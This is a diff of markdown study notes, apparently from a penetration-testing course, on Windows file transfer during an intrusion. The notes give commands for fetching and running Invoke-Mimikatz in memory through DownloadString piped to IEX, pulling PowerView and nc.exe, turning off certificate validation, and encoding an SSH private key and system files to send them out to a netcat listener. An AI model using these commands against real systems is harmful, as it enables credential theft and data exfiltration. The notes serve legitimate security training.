@@ -1,12 +1,14 @@
 # Windows File Transfers
 
-## PowerShell Base64 Encode & Decode
+## Download Operations
+
+### PowerShell Base64 Encode & Decode
 
 If a file is small in size, we can encode a file to base64 string, copy its content from the terminal and perform the reverse operation decoding the file in the original content
 
 Primary usage: If the file content is very small in size and we have access to the terminal
 
-### Encode file content to base64
+#### Encode file content to base64
 
 ```bash
 cat id_rsa |base64 -w 0;echo
@@ -18,7 +20,7 @@ Copy this to a windows powershell ans use it to decode it
 [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("STRING"))
 ```
 
-## PowerShell Web Downloads
+### PowerShell Web Downloads
 
 PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:
 
@@ -33,7 +35,7 @@ PowerShell offers many file transfer options. In any version of PowerShell, the 
 | DownloadString | Downloads a String from a resource and returns a String. |
 | DownloadStringAsync | Downloads a String from a resource without blocking the calling thread. |
 
-### PowerShell DownloadFile Method
+#### PowerShell DownloadFile Method
 
 ```powershell
 (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
@@ -53,7 +55,7 @@ PowerShell offers many file transfer options. In any version of PowerShell, the 
 (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
 ```
 
-### PowerShell DownloadString - Fileless Method
+#### PowerShell DownloadString - Fileless Method
 
 Fileless method means that we can use a file and executing it without saving the file itself to the disk. We can run it directly in memory using the Invoke-Expression cmdlet ot it's alias IEX
 
@@ -67,7 +69,7 @@ IEX also accepts pipeline input
 (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
 ```
 
-### PowerShell Invoke-WebRequest
+#### PowerShell Invoke-WebRequest
 
 Can be used to download files, we can also use its aliases iwr, curl, wget instead of the Invoke-WebRequest
 
@@ -75,7 +77,7 @@ Can be used to download files, we can also use its aliases iwr, curl, wget inste
 Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
 ```
 
-### Common Errors with PowerShell
+#### Common Errors with PowerShell
 
 There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`
 
@@ -107,9 +109,9 @@ At line:1 char:1
 PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 
-## SMB Downloads
+### SMB Downloads
 
-### Create the SMB Server
+#### Create the SMB Server
 
 ```bash
 impacket-smbserver [shareName] [sharePath]
@@ -164,15 +166,139 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 Now we can connect to it using 
 
-```
+```powershell
 net use n: \\192.168.220.133\share /user:test test
 The command completed successfully.
 copy n:\nc.exe
 ```
 
-## FTP Downloads
+### FTP Downloads
 
+We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.
 
+#### Installing the FTP Server Python3 Module pyftpdlib
 
+```bash
+pip3 install pyftpdlib
+```
+
+pyftpdlib uses port 2121 by default. Anonymous authentication is enabled by default if we don't set a user and password.
+
+#### Setting up a Python3 FTP Server
+
+```bash
+python3 -m pyftpdlib --port <port number>
+```
+
+```bash
+sudo python3 -m pyftpdlib --port 21
+
+[I 2022-05-17 10:09:19] concurrency model: async
+[I 2022-05-17 10:09:19] masquerade (NAT) address: None
+[I 2022-05-17 10:09:19] passive ports: None
+[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
+```
+
+#### Transfering Files from an FTP Server Using PowerShell
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+```
+
+#### Create a Command File for the FTP Client and Download the Target File
+
+When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
+
+File example:
+
+```
+open [IP]
+USER anonymous
+binary
+GET [filename]
+bye
+```
+
+And then execute this file using this command
+
+```bash
+ftp -v -n -s:ftpcommand.txt
+```
+
+## Uplaod Operations
+
+### PowerShell Base64 Encode & Decode
+
+#### Encode File Using PowerShell
+
+```powershell
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+```
+
+#### Decode Base64 String in Linux
+
+```bash
+echo [HASH] | base64 -d > hosts
+```
+
+### PowerShell Web Uploads
+
+PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.
+
+For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page. Let's install it and start the webserver.
+
+#### Installing a Configured WebServer with Upload
+
+```bash
+pip3 install uploadserver
+```
+
+Usage
+
+```bash
+python -m uploadserver
+```
+
+Now we can use a PowerShell script PSUpload.ps1 which uses Invoke-RestMethod to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file.
+
+#### PowerShell Script to Upload a File to Python Upload Server
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('[URL]')
+```
+
+```powershell
+Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+```
+
+#### PowerShell Base64 Web Upload
+
+Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.
+
+```
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+```
+```
+Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+```
+
+```
+echo <base64> | base64 -d -w 0 > hosts
+```
+
+```
+nc -lvnp 8000
+
+listening on [any] 8000 ...
+connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
+Content-Type: application/x-www-form-urlencoded
+Host: 192.168.49.128:8000
+Content-Length: 1820
+Connection: Keep-Alive
+
+IyBDb3B5cmlnaHQgK
+```
 
 # Linux File Transfers
